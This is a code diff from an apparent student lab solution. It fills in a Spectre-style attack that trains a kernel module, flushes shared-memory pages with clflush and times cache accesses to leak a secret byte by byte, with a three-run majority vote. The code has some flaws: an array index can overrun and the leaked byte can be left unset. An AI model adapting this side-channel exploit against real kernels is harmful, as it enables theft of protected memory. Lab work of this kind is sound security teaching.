@@ -39,15 +39,61 @@ static inline void call_kernel_part2(int kernel_fd, char *shared_memory, size_t 
  */
 int run_attacker(int kernel_fd, char *shared_memory) {
     char leaked_str[LAB2_SECRET_MAX_LEN];
+    char leaked_byte_array[3];
     size_t current_offset = 0;
-
+    int access_time;
+    int found[3] = {0, 0, 0};
+    
     printf("Launching attacker\n");
 
     for (current_offset = 0; current_offset < LAB2_SECRET_MAX_LEN; current_offset++) {
         char leaked_byte;
 
+    for (int rep = 0; rep < 3; ) { 
         // [Part 2]- Fill this in!
         // leaked_byte = ??
+       for (int i =0; i < 10; i++) {	
+       
+	       call_kernel_part2(kernel_fd, shared_memory, 0);
+       }
+
+       for (int pages = 0; pages < 128; pages++) {
+           clflush(shared_memory + 4096*pages);
+       }
+
+       call_kernel_part2(kernel_fd, shared_memory, current_offset);
+
+       for (int cache_line = 0; cache_line < 128; cache_line++) {
+	       access_time = time_access(shared_memory + 4096*cache_line);
+               if (access_time < 150) {
+		       
+		leaked_byte_array[rep] = (char) cache_line;
+		rep++;
+		//leaked_byte = (char) cache_line;
+	
+	       //printf("The time access for block %d is %d with leaked byte is %c\n",cache_line, access_time, leaked_byte); 
+	       
+	       }
+          }
+
+   }
+     for (int i =0; i <3; i++) {
+	  for (int j = 0; j < 3; j++) {
+             if (i != j) 
+              if (leaked_byte_array[i] == leaked_byte_array[j]) {
+	          found[i]++;
+	      }
+        }
+     }
+     for (int i =0; i < 3; i++) {
+      if (found[i] >= 2) {
+      leaked_byte = leaked_byte_array[i];
+      break; 
+      }
+     }
+     
+
+
 
         leaked_str[current_offset] = leaked_byte;
         if (leaked_byte == '\x00') {
